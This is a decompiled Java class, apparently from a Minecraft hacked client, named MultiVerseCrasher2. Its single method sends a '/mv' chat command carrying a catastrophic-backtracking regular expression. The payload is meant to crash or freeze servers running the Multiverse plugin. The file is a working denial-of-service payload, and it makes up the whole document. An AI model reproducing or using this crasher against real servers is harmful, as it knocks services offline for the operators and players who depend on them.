// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.mvc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraft.client.Minecraft;

public class MultiVerseCrasher2
{
    public static void start() {
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^"));
    }
}
